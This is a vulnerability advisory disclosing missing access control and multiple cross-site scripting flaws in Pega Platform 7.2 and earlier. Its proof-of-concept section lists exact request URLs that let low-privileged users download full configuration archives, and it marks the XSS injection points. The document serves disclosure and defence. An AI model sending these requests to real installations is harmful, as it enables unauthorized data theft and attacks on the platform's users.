@@ -1,0 +1,89 @@
+Summary
+=======
+1. Missing access control (CVE-2017-11356)
+2. Multiple cross-site scripting (CVE-2017-11355)
+
+
+Vendor
+======
+"Pegasystems Inc. is the leader in software for customer engagement and
+operational excellence. Pega’s adaptive, cloud-architected software – built
+on its unified Pega® Platform – empowers people to rapidly deploy, and
+easily extend and change applications to meet strategic business needs.
+Over its 30-year history, Pega has delivered award-winning capabilities in
+CRM and BPM, powered by advanced artificial intelligence and robotic
+automation, to help the world’s leading brands achieve breakthrough
+business results."
+
+https://www.pega.com/about
+
+
+Tested version
+==============
+PEGA Platform <= 7.2 ML0
+
+
+Vulnerabilities and PoC
+=======================
+1. Missing access control on the application distribution export
+functionality (CVE-2017-11356)
+
+Low privileged users can directly access the administrator resources to
+download a full compressed file with configurations and files of the
+platform, a 300MB compressed file was downloaded in a production
+environment.
+
+Affected components could be found on the PEGA Designer Studio through the
+"Application > Distribution > Export" path.
+
+To exploit this vulnerability the following requests must be made:
+
+1.1 Export Mode: By application
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=Rule-Application.pzLPPerformAppExport&ApplicationName=APPNAME&ApplicationVersion=VERSION
+https://PEGASERVER/prweb/RANDOMTOKEN/ServiceExport/APPNAME_VERSION_DATE_GMT.zip
+
+1.2 Export Mode: By RuleSet/Version
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=Rule-RuleSet-Version.PegaRULESMove_RunBatchReq&pyZipFileName=configurations.zip&pyRuleSet=APPNAME&pyRuleSetVersion=VERSION&pyAppContext=&PageName=pyZipMoveRuleSets
+https://PEGASERVER/prweb/RANDOMTOKEN/ServiceExport/configurations.zip
+
+1.3 Export Mode: By Product
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=Rule-Admin-Product.RunBatchReq&ZipFileName=configurations.zip&ProductKey=RULE-ADMIN-PRODUCT%20APPNAME%20DATE%20GMT
+https://PEGASERVER/prweb/RANDOMTOKEN/ServiceExport/configurations.zip
+
+1.4 Archive On Server
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=@baseclass.DownloadFile&FileName=FILENAME
+
+
+2. Multiple cross-site scripting (CVE-2017-11355)
+
+2.1 Main page
+
+https://PEGASERVER/prweb/RANDOMTOKEN/![XSS]
+
+2.2 JavaBean viewer
+
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=Data-Admin-IS-.JavaBeanViewer&beanReference=[XSS]
+
+2.3 System database schema modification
+
+https://PEGASERVER/prweb/RANDOMTOKEN/!STANDARD?pyActivity=Data-Admin-DB-Table.DBSchema_ListClassesInTable
+POST:
+pzFromFrame=&pzUseThread=&pzTransactionId=&pzPrimaryPageName=pyDbSchemaTablesList&pyDatabaseName=PegaDATA&pyTableName=[XSS]
+
+
+Variables
+=========
+PEGASERVER: IP/domain of the platform installation.
+RANDOMTOKEN: random token generated per installation, it is random but
+known to the user.
+APPNAME: name of the application.
+VERSION: application version.
+FILENAME: physical filename of the backup.
+DATE: current date of the request.
+
+
+Timeline
+========
+01/06/2017: Vendor is notified through support and security email
+07/06/2017: CERT/CC contacted, vulnerabilities are not coordinated
+17/07/2017: No response from vendor, CVE assigned, full disclosure
